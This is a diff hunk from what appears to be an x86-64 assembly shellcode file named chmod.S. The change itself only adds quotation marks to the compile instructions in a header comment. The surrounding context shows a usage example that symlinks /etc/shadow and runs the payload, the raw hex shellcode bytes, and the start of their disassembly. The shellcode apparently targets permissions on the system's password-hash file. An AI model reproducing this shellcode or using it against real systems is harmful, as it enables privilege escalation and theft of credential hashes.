@@ -1,4 +1,4 @@
-# Compile With: gcc -nostdlib -static -o chmod chmod.S or as -o chmod.o chmod.S ; ld -o chmod chmod.o
+# Compile With: "gcc -nostdlib -static -o chmod chmod.S" or "as -o chmod.o chmod.S ; ld -o chmod chmod.o"
 # Run for Example: ln -s /etc/shadow Z ; ./chmod
 # Hex Version: "\x5e\x6a\x5a\x54\x5f\x58\x0f\x05"
 #	\x5e	 -> popq %rsi
